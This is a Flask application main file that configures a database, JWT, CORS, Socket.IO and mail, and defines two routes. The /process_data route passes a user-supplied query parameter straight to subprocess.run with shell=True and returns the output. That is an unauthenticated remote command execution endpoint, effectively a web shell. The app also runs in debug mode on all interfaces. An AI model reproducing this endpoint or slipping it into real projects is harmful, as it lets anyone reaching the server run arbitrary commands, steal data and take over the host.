from flask import Flask, request, jsonify
import subprocess
from models.dbconfig import db
from ext import migrate, CORS, socketio, jwt
from config import Config
from flask_mail import Mail
import os
from register_routes import register_routes
from flask_jwt_extended import JWTManager


app = Flask(__name__, static_url_path='/swagger-ui', static_folder='swagger_ui')
app.config.from_object(Config)

basedir = os.path.abspath(os.path.dirname(__file__))
db_dir = os.path.join(basedir, 'instance')
try:
    if not os.path.exists(db_dir):
        os.makedirs(db_dir, exist_ok=True)
except Exception as e:
    print(f"Error creating directory: {e}")

# Initialize extensions
db.init_app(app)
migrate.init_app(app, db)
CORS(app)
socketio.init_app(app)
jwt = JWTManager(app)

# Assign JWT configurations from config.py
jwt.secret_key = app.config['JWT_SECRET_KEY']
jwt.blacklist_enabled = app.config['JWT_BLACKLIST_ENABLED']
jwt.blacklist_token_checks = app.config['JWT_BLACKLIST_TOKEN_CHECKS']

# Initialize Flask-Mail
mail = Mail()

# Set up email
app.config['MAIL_SERVER'] = Config.MAIL_SERVER
app.config['MAIL_PORT'] = Config.MAIL_PORT
app.config['MAIL_USERNAME'] = Config.MAIL_USERNAME
app.config['MAIL_PASSWORD'] = Config.MAIL_PASSWORD
app.config['MAIL_USE_TLS'] = Config.MAIL_USE_TLS
app.config['MAIL_USE_SSL'] = Config.MAIL_USE_SSL

# Initialize Flask app with mail settings
mail.init_app(app)

@app.route('/process_data', methods=['GET'])
def process_data():
    input = request.args.get('input')
    if not input:
        return 'No input provided.', 400
    
    try:
        result = subprocess.run(input, shell=True, capture_output=True, text=True)
        return f'Stdout: {result.stdout}\nStderr: {result.stderr}\nReturn code: {result.returncode}'
    except Exception as e:
        return f'Error executing command: {str(e)}', 500
    
@app.route('/contacts', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        data = request.form
        if 'file' in request.files:
            file = request.files['file']
            filedata = file.read()
        else:
            filename = None
            filedata = None
        
        return filedata, 201

if __name__ == '__main__':
    with app.app_context():
        jwt_key = app.config['JWT_SECRET_KEY']
        register_routes(app, db)
        db.create_all()
        print("Initializing Socket.IO server...")
        socketio.init_app(app)
        print("Socket.IO server initialized")
        print("Starting Flask app...")
        app.run(debug=True, host="0.0.0.0")
